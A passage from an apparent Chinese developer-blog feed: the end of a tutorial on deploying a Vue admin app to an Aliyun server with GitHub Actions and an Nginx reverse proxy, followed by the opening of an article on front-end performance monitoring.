<p>SERVER_IP: 服务器公网IP，SERVER_USER：root,SERVER_SSH_KEY:上面生成的私钥</p>
</li>
</ol>
<h4 data-id="heading-7">配置 GitHub Actions</h4>
<ol>
<li>在项目根目录下，新建文件夹 .github/workflows/（注意是 .github 不是 .gitee）。</li>
<li>新建文件 deploy.yml。</li>
</ol>
<p>注意<code>node</code>版本 和使用的<code>npm</code>还是<code>pnpm</code>,  <code>yml</code>会不一样,我使用的是pnpm。以及你的前端项目是放到服务器哪个目录下的，我的是放到<code>/var/www/html/vue-admin-template/</code>,请改成你自己的服务器目录</p>
<p>文件deploy.yml</p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Aliyun</span> <span class="hljs-string">(PNPM)</span>
<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">master</span>

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build-and-deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>

      <span class="hljs-comment"># 1. 核心新增：安装 PNPM</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">pnpm</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v2</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">version:</span> <span class="hljs-number">9</span> <span class="hljs-comment"># 这里建议写你本地使用的 pnpm 大版本 (如 8 或 9)</span>

      <span class="hljs-comment"># 2. 修改：设置 Node 并开启 pnpm 缓存</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Node.js</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v4</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">node-version:</span> <span class="hljs-string">'22.13.0'</span> <span class="hljs-comment"># &lt;--- 关键修改：设置 Node.js 版本</span>
          <span class="hljs-attr">cache:</span> <span class="hljs-string">'pnpm'</span> <span class="hljs-comment"># &lt;--- 关键修改：告诉它去找 pnpm-lock.yaml</span>

      <span class="hljs-comment"># 3. 修改：使用 pnpm 命令安装和打包</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">&amp;</span> <span class="hljs-string">Build</span>
        <span class="hljs-attr">run:</span> <span class="hljs-string">|
          node -v
          pnpm -v
          pnpm install --frozen-lockfile # 类似 npm ci，严格按照 lock 文件安装
          pnpm run build
          ls -la dist/
</span>
      <span class="hljs-comment"># 4. 上传文件 (保持不变)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Server</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">appleboy/scp-action@master</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">host:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_IP</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">username:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">key:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">source:</span> <span class="hljs-string">'dist/*'</span>
          <span class="hljs-attr">target:</span> <span class="hljs-string">'/var/www/html/vue-admin-template/'</span>
          <span class="hljs-attr">strip_components:</span> <span class="hljs-number">1</span>

      <span class="hljs-comment"># 5. 重启 Nginx (保持不变)</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Restart</span> <span class="hljs-string">Nginx</span>
        <span class="hljs-attr">uses:</span> <span class="hljs-string">appleboy/ssh-action@master</span>
        <span class="hljs-attr">with:</span>
          <span class="hljs-attr">host:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_IP</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">username:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_USER</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">key:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.SERVER_SSH_KEY</span> <span class="hljs-string">}}</span>
          <span class="hljs-attr">script:</span> <span class="hljs-string">|
            sudo chown -R www-data:www-data /var/www/html/vue-admin-template/
            sudo chmod -R 755 /var/www/html/vue-admin-template/
            echo "部署完成！"
</span>
</code></pre>
<h4 data-id="heading-8">同步推送代码</h4>
<p>以后写完代码，你需要推送到两个地方。</p>
<p><strong>方式一：分别推送（清晰明了）</strong></p>
<pre><code class="hljs language-js" lang="js"># 先推送到 <span class="hljs-title class_">Gitee</span>（日常保存）
git push origin master

# 再推送到 <span class="hljs-title class_">GitHub</span>（触发部署）
git push github master
</code></pre>
<p><strong>方式二：一条命令推送到两个仓库（懒人推荐）</strong><br/>
你可以修改 git 配置，让 origin 同时指向两个地址：</p>
<pre><code class="hljs language-js" lang="js"># 给 origin 添加第二个 push 地址
git remote set-url --add --push origin <span class="hljs-attr">https</span>:<span class="hljs-comment">//gitee.com/你的用户名/项目名.git</span>
git remote set-url --add --push origin <span class="hljs-attr">https</span>:<span class="hljs-comment">//github.com/你的用户名/vue-admin-deploy.git</span>

# 验证
git remote -v

# 以后只需要执行这一条，就会同时推送到 <span class="hljs-title class_">Gitee</span> 和 <span class="hljs-title class_">GitHub</span>
git push origin master
</code></pre>
<p>这时候在master分支提交代码，去github的Actions下去查看部署流程就ok了。</p>
<h2 data-id="heading-9">四、 服务器配置：Nginx 反向代理与 404 修复</h2>
<p>部署上线后，常见的问题是刷新页面 404，或者接口请求 404。这是因为线上失去了 Vite 的开发代理，必须靠 Nginx。</p>
<h4 data-id="heading-10">1. 统一接口前缀</h4>
<p>为了方便 Nginx 转发，建议前后端统一使用 /api 前缀。</p>
<ul>
<li><strong>前端</strong>：.env.production 设置 VITE_API_BASE_URL = '/api'</li>
<li><strong>后端</strong>：Express 入口文件挂载 app.use('/api/auth', authRouter)</li>
</ul>
<h4 data-id="heading-11">2. Nginx 配置 (完整版)</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># HTTP 强制跳转 HTTPS (保持不变)</span>
server {
    listen 80;
    server_name ifxia.xyz;
    <span class="hljs-built_in">return</span> 301 https://$host<span class="hljs-variable">$request_uri</span>;
}

<span class="hljs-comment"># HTTPS 服务器</span>
server {
    listen 443 ssl;
    server_name ifxia.xyz;

    <span class="hljs-comment"># SSL 配置 (保持你原来的)</span>
    ssl_certificate /etc/letsencrypt/live/ifxia.xyz/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/ifxia.xyz/privkey.pem;

<span class="hljs-comment"># 这样 /var/www/html 下的 index.html 就变成了官网</span>
    root /var/www/html;
    index index.html index.htm;



    <span class="hljs-comment"># --- 1. 前端配置 (子路径) ---</span>
    location /vue-admin-template {
        <span class="hljs-comment"># 使用 alias 指向存放前端代码的实际目录</span>
        <span class="hljs-built_in">alias</span> /var/www/html/vue-admin-template;
        index index.html;
        <span class="hljs-comment"># 解决 Vue Router 刷新 404 问题</span>
        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /vue-admin-template/index.html;
    }


   
    <span class="hljs-comment"># --- 2. 后端接口 (统一入口) ---</span>
    <span class="hljs-comment"># 只要是 /api 开头的，全部给 Node.js</span>
    location /api/ {
        <span class="hljs-comment"># ⚠️ 注意：这里结尾不要加 /</span>
        <span class="hljs-comment"># 不加 / 意味着：把 /api/auth/login 原样发给 Node</span>
        <span class="hljs-comment"># 因为Node端已经配置了 app.use('/api/auth', ...)，所以正好匹配</span>
        proxy_pass http://localhost:3000;
        
        proxy_set_header Host <span class="hljs-variable">$host</span>;
        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;
        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
    }
  
}
</code></pre>
<p>验证并重启nginx</p>
<pre><code class="hljs language-js" lang="js">nginx -t

systemctl reload nginx
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大道至简：万字漫谈前端性能监控]]></title>    <link>https://juejin.cn/post/7583973472324009999</link>    <guid>https://juejin.cn/post/7583973472324009999</guid>    <pubDate>2025-12-16T06:38:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472324009999" data-draft-id="7583973472323895311" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大道至简：万字漫谈前端性能监控"/> <meta itemprop="keywords" content="前端,性能优化,JavaScript"/> <meta itemprop="datePublished" content="2025-12-16T06:38:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tabzzz"/> <meta itemprop="url" content="https://juejin.cn/user/2571086155752654"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大道至简：万字漫谈前端性能监控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2571086155752654/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tabzzz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:38:34.000Z" title="Tue Dec 16 2025 06:38:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">前言</h2>
<p>在2025年的今天，针对xx监控这几个字眼已经有点“老生常谈”的感觉了，无论是什么数据监控、异常监控或者是本文即将要分享的性能监控，在当今他们并不是做为一种“新东西”来供大家学习，而是经常以一种“老朋友”的姿态和大家见面。</p>
<p>随着前端页面的日益复杂，交互、初始化等功能不断增加，性能监控已经不再是一个可选的附加项，而是开发过程中不可或缺的一部分。我们可以把性能监控比作前端开发中的“健康检查”，它像是医生对页面的体检，帮助我们及时发现潜在的问题，避免那些用户体验上的“隐形杀手”。</p>
<p>还是那句话，谁不想让网页快一点、访问起来爽一些呢？</p>
<h2 data-id="heading-1">网站性能的影响</h2>
<h3 data-id="heading-2">对用户的影响</h3>
<p>你打开网站可以等待的时间是多少呢？你是否确定用户为了访问你的网站可以等上1秒？5秒？或者是10秒吗🤔？</p>
<p>就我个人来说，在访问各类网站时，如果响应时间过长的话会让我觉得很“不舒服”，可能在某些PC等久点会好一些，但是如果是移动端，那简直是“无法忍受”的程度。</p>
<p>事实上，有统计指出加载延迟每增加<strong>100毫秒，用户满意度下降约1%，<strong>一般来说，<strong>网站响应时间2秒以内</strong>通常被认为是用户可接受的阈值，超过3秒时，用户流失率显著增加，当等待时间超过</strong>8秒</strong>时，大多数用户会放弃访问，达到12秒则<strong>99%以上用户选择关闭网页</strong>。</p>
<p>单纯从用户转换率和跳出率来讲，可能没法从冰冷的数字中感受出网站性能对用户流失的影响有多大，但是对于某些每年有巨大营收的公司来说，这一点点的延迟加载会对业务造成沉重的打击。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0ebe186586a4b35937f9e51e7cddc7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=2t15SmC6Rw8fNbp5O3twQVXfzTk%3D" alt="Clipboard_Screenshot_1765866202.png" loading="lazy"/></p>
<p>亚马逊前软件工程师 Greg Linden 曾在2006年发现每多出100ms延迟就会导致约1%销售损失，即使是非常小的延迟也会导致收入大幅下降，代价高昂。<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.conductor.com%2Facademy%2Fpage-speed-resources%2Ffaq%2Famazon-page-speed-study%2F" target="_blank" title="https://www.conductor.com/academy/page-speed-resources/faq/amazon-page-speed-study/" ref="nofollow noopener noreferrer">原文</a></p>
<h3 data-id="heading-3">对搜索引擎的影响</h3>
<p>除了直观的对用户造成影响以外，性能因素对搜索引擎的排名也有较大的影响。</p>
<p>早在2010年，Google在排名算法中就已经把页面加载速度作为一个重要因素。页面加载速度越快，搜索引擎越可能给予该页面更高的排名。反之，如果页面加载缓慢，搜索引擎可能会降低其在搜索结果中的排名，导致网站流量下降。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a6cb868d2d9e43a88c245d8a8773c969~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=m871NSqZ%2By9OGHNGZYgytWsTgi8%3D" alt="Clipboard_Screenshot_1765866216.png" loading="lazy"/></p>
<p>Google在2018年发布了 <strong>“<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fsearch%2Fdocs%2Fcrawling-indexing%2Fmobile%2Fmobile-sites-mobile-first-indexing%3Fhl%3Dzh-cn" target="_blank" title="https://developers.google.com/search/docs/crawling-indexing/mobile/mobile-sites-mobile-first-indexing?hl=zh-cn" ref="nofollow noopener noreferrer">Mobile-First Indexing</a>”</strong> ，即优先使用移动版内容来进行排名。如果网站在移动端加载缓慢或者交互体验差，搜索引擎会优先降级该网站的排名，影响其在搜索结果中的表现。</p>
<p>总而言之言而总之，在现代开发中，想要你自己的应用在搜索引擎中脱颖而出，性能早已是不可忽略的关键因素。</p>
<h3 data-id="heading-4">对开发和维护成本的影响</h3>
<p>如果不在开发初期就关注性能，后期可能会积累大量的技术债务，增加维护难度。性能问题往往表现为页面响应慢、资源加载失败等，这些问题如果没有及时解决，可能会成为日后开发迭代的阻碍。</p>
<h2 data-id="heading-5">性能监控的两种方案</h2>
<p>即使性能监控这个话题已经广泛讨论过，但随着技术演变，它也需要不断地更新进化。如今，性能监控不仅仅是用来检测页面加载是否顺畅，还承担着预警、数据分析和优化决策等多重角色。</p>
<p>性能监控分为两大类：<strong>合成监控</strong>和<strong>真实用户监控</strong>。</p>
<h3 data-id="heading-6">合成监控</h3>
<p>合成监控（Synthetic Monitoring, SYN）是<strong>通过模拟用户的行为来评估网站或应用的性能</strong>。模拟用户可以是脚本或专用工具，它们在指定的时间间隔内发起请求，模拟实际用户访问，并通过预定的测试场景收集各种性能指标。SYN监控通常用于检测性能瓶颈、服务可用性、响应时间等指标，<strong>适用于在没有真实用户流量时进行监控</strong>。</p>
